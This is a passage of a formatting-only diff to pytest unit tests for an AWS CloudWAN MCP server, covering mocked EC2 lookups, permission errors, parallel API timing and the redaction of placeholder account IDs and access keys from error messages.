             response = json.loads(result)
@@ -252,37 +262,38 @@
         """Test handling of AWS API timeouts."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # Simulate slow API response
             async def slow_response(*args, **kwargs):
                 await asyncio.sleep(0.1)  # Simulate delay
                 return {"NetworkInterfaces": []}
-            
+
             ec2.describe_network_interfaces.return_value = {"NetworkInterfaces": []}
             mock_client.return_value = ec2
-            
+
             # Should complete without timeout errors
             result = await discover_ip_details("10.0.0.1")
             response = json.loads(result)
-            
+
             assert response["success"] is True
             assert "timestamp" in response
 
-    @pytest.mark.integration 
+    @pytest.mark.integration
     async def test_real_aws_integration(self):
         """Integration test with real AWS environment (requires valid credentials)."""
         # Skip if no AWS credentials available
         try:
             import boto3
-            sts = boto3.client('sts')
+
+            sts = boto3.client("sts")
             sts.get_caller_identity()
         except Exception:
             pytest.skip("No valid AWS credentials for integration test")
-        
+
         # Test with a known public IP (AWS service IP)
         result = await discover_ip_details("8.8.8.8")  # External IP - should not find ENI
         response = json.loads(result)
-        
+
         assert response["success"] is True
         assert response["aws_networking_context"]["eni_details"]["eni_found"] is False
         assert response["services_queried"] >= 1
@@ -291,29 +302,33 @@
         """Test handling of large security group datasets."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # ENI with multiple security groups
             ec2.describe_network_interfaces.return_value = {
-                "NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-multi-sg",
-                    "Groups": [{"GroupId": f"sg-{i}"} for i in range(10)]  # 10 SGs
-                }]
+                "NetworkInterfaces": [
+                    {
+                        "NetworkInterfaceId": "eni-multi-sg",
+                        "Groups": [{"GroupId": f"sg-{i}"} for i in range(10)],  # 10 SGs
+                    }
+                ]
             }
-            
+
             # Large security group response
             large_sg_list = []
             for i in range(10):
-                large_sg_list.append({
-                    "GroupId": f"sg-{i}",
-                    "GroupName": f"sg-name-{i}",
-                    "IpPermissions": [{"IpProtocol": "tcp", "FromPort": 80, "ToPort": 80}],
-                    "IpPermissionsEgress": [{"IpProtocol": "-1"}]
-                })
-            
+                large_sg_list.append(
+                    {
+                        "GroupId": f"sg-{i}",
+                        "GroupName": f"sg-name-{i}",
+                        "IpPermissions": [{"IpProtocol": "tcp", "FromPort": 80, "ToPort": 80}],
+                        "IpPermissionsEgress": [{"IpProtocol": "-1"}],
+                    }
+                )
+
             ec2.describe_security_groups.return_value = {"SecurityGroups": large_sg_list}
             ec2.describe_route_tables.return_value = {"RouteTables": []}
             ec2.describe_instances.return_value = {"Reservations": []}
-            
+
             mock_client.return_value = ec2
             result = await discover_ip_details("10.0.0.5")
             response = json.loads(result)
@@ -328,41 +343,47 @@
         """Validate that API calls execute in parallel, not sequentially."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # Add delays to simulate API response time
             async def delayed_eni_response(*args, **kwargs):
                 await asyncio.sleep(0.1)
-                return {"NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-timing",
-                    "SubnetId": "subnet-timing",
-                    "Groups": [{"GroupId": "sg-timing"}],
-                    "Attachment": {"InstanceId": "i-timing"}
-                }]}
-                
+                return {
+                    "NetworkInterfaces": [
+                        {
+                            "NetworkInterfaceId": "eni-timing",
+                            "SubnetId": "subnet-timing",
+                            "Groups": [{"GroupId": "sg-timing"}],
+                            "Attachment": {"InstanceId": "i-timing"},
+                        }
+                    ]
+                }
+
             async def delayed_route_response(*args, **kwargs):
-                await asyncio.sleep(0.1) 
+                await asyncio.sleep(0.1)
                 return {"RouteTables": []}
-                
+
             async def delayed_sg_response(*args, **kwargs):
                 await asyncio.sleep(0.1)
                 return {"SecurityGroups": []}
-                
+
             async def delayed_instance_response(*args, **kwargs):
                 await asyncio.sleep(0.1)
                 return {"Reservations": []}
-            
+
             ec2.describe_network_interfaces.return_value = {
-                "NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-timing",
-                    "SubnetId": "subnet-timing", 
-                    "Groups": [{"GroupId": "sg-timing"}],
-                    "Attachment": {"InstanceId": "i-timing"}
-                }]
+                "NetworkInterfaces": [
+                    {
+                        "NetworkInterfaceId": "eni-timing",
+                        "SubnetId": "subnet-timing",
+                        "Groups": [{"GroupId": "sg-timing"}],
+                        "Attachment": {"InstanceId": "i-timing"},
+                    }
+                ]
             }
             ec2.describe_route_tables.return_value = {"RouteTables": []}
             ec2.describe_security_groups.return_value = {"SecurityGroups": []}
             ec2.describe_instances.return_value = {"Reservations": []}
-            
+
             mock_client.return_value = ec2
 
             start_time = asyncio.get_event_loop().time()
@@ -371,7 +392,7 @@
 
             # Should complete in less than sequential time (would be ~0.4s if sequential)
             assert elapsed_time < 0.3  # Parallel execution should be faster
-            
+
             response = json.loads(result)
             assert response["success"] is True
 
@@ -379,16 +400,15 @@
         """Test handling of various AWS permission scenarios."""
         test_cases = [
             ("UnauthorizedOperation", "Not authorized for network interfaces"),
-            ("AccessDenied", "Access denied to describe resources"), 
-            ("InvalidParameter", "Invalid parameter in request")
+            ("AccessDenied", "Access denied to describe resources"),
+            ("InvalidParameter", "Invalid parameter in request"),
         ]
-        
+
         for error_code, error_message in test_cases:
             with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
                 ec2 = MagicMock()
                 ec2.describe_network_interfaces.side_effect = ClientError(
-                    {"Error": {"Code": error_code, "Message": error_message}}, 
-                    "DescribeNetworkInterfaces"
+                    {"Error": {"Code": error_code, "Message": error_message}}, "DescribeNetworkInterfaces"
                 )
                 mock_client.return_value = ec2
 
@@ -401,7 +421,7 @@
     async def test_ipv6_address_handling(self):
         """Test IPv6 address processing."""
         ipv6_address = "2001:db8::1"
-        
+
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
             ec2.describe_network_interfaces.return_value = {"NetworkInterfaces": []}
@@ -418,28 +438,30 @@
         """Test ENI discovery when ENI exists but has no instance attachment."""
         with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
             ec2 = MagicMock()
-            
+
             # ENI without attachment (e.g., Lambda ENI, ALB ENI)
             ec2.describe_network_interfaces.return_value = {
-                "NetworkInterfaces": [{
-                    "NetworkInterfaceId": "eni-no-instance",
-                    "SubnetId": "subnet-lambda",
-                    "Groups": [{"GroupId": "sg-lambda"}],
-                    "Status": "in-use",
-                    "Attachment": {}  # No InstanceId
-                }]
+                "NetworkInterfaces": [
+                    {
+                        "NetworkInterfaceId": "eni-no-instance",
+                        "SubnetId": "subnet-lambda",
+                        "Groups": [{"GroupId": "sg-lambda"}],
+                        "Status": "in-use",
+                        "Attachment": {},  # No InstanceId
+                    }
+                ]
             }
-            
+
             ec2.describe_route_tables.return_value = {"RouteTables": []}
             ec2.describe_security_groups.return_value = {"SecurityGroups": []}
-            
+
             mock_client.return_value = ec2
             result = await discover_ip_details("10.0.1.50")
             response = json.loads(result)
 
             # ENI should be found
             assert response["aws_networking_context"]["eni_details"]["eni_found"] is True
-            
+
             # Resources should indicate no instance attachment
             resources = response["aws_networking_context"]["associated_resources"]
             assert resources["resources_found"] is False
@@ -449,24 +471,28 @@
         """Comprehensive test of error message sanitization."""
         sensitive_messages = [
             "Failed to connect to arn:aws:ec2:us-east-1:123456789012:instance/i-1234567890abcdef0",
-            "Access key AKIA1234567890123456 is invalid",  
+            "Access key AKIA1234567890123456 is invalid",
             "Session token IQoJb3JpZ2luX2VjEPD...very-long-token expired",
             "Profile admin-user in region us-east-1 failed",
-            "Account 123456789012 access denied"
+            "Account 123456789012 access denied",
         ]
-        
+
         for message in sensitive_messages:
             with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
                 ec2 = MagicMock()
                 ec2.describe_network_interfaces.side_effect = Exception(message)
                 mock_client.return_value = ec2
 
-                result = await discover_ip_details("10.0.0.1") 
+                result = await discover_ip_details("10.0.0.1")
                 response = json.loads(result)
 
                 # Verify sanitization occurred
                 error_text = response.get("error", "")
-                assert "[ARN_REDACTED]" in error_text or "[ACCESS_KEY_REDACTED]" in error_text or "[ACCOUNT_REDACTED]" in error_text
+                assert (
+                    "[ARN_REDACTED]" in error_text
+                    or "[ACCESS_KEY_REDACTED]" in error_text
+                    or "[ACCOUNT_REDACTED]" in error_text
+                )
                 assert "123456789012" not in error_text
                 assert "AKIA1234567890123456" not in error_text
 
@@ -475,9 +501,9 @@
         test_scenarios = [
             ("10.0.0.1", "success_scenario"),
             ("invalid-ip", "failure_scenario"),
-            ("127.0.0.1", "loopback_scenario")
+            ("127.0.0.1", "loopback_scenario"),
         ]
-        
+
         for ip, scenario in test_scenarios:
             if scenario == "success_scenario":
                 with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
@@ -487,10 +513,10 @@
                     result = await discover_ip_details(ip)
             else:
                 result = await discover_ip_details(ip)
-            
+
             response = json.loads(result)
-            
+
             # All responses should have consistent base fields
             required_fields = ["success", "ip_address"] if scenario != "failure_scenario" else ["success", "error"]
             for field in required_fields:
-                assert field in response, f"Missing {field} in {scenario}"
\ No newline at end of file
+                assert field in response, f"Missing {field} in {scenario}"

--- tests/unit/test_validation_tools.py
+++ tests/unit/test_validation_tools.py
@@ -121,7 +121,9 @@
         assert response["policy_version"] == "2021.12"
 
     @pytest.mark.asyncio
-    async def test_ip_validation_with_fixtures(self, mock_ip_addresses: list[str], mock_get_aws_client: Generator) -> None:  # Added types
+    async def test_ip_validation_with_fixtures(
+        self, mock_ip_addresses: list[str], mock_get_aws_client: Generator
+    ) -> None:  # Added types
         """Test IP validation using fixture data."""
         from awslabs.cloudwan_mcp_server.server import validate_ip_cidr
 
@@ -133,7 +135,9 @@
             assert response["ip_address"] == ip
 
     @pytest.mark.asyncio
-    async def test_cidr_validation_with_fixtures(self, mock_cidr_blocks: list[str], mock_get_aws_client: Generator) -> None:  # Added types
+    async def test_cidr_validation_with_fixtures(
+        self, mock_cidr_blocks: list[str], mock_get_aws_client: Generator
+    ) -> None:  # Added types
         """Test CIDR validation using fixture data."""
         from awslabs.cloudwan_mcp_server.server import validate_ip_cidr
 

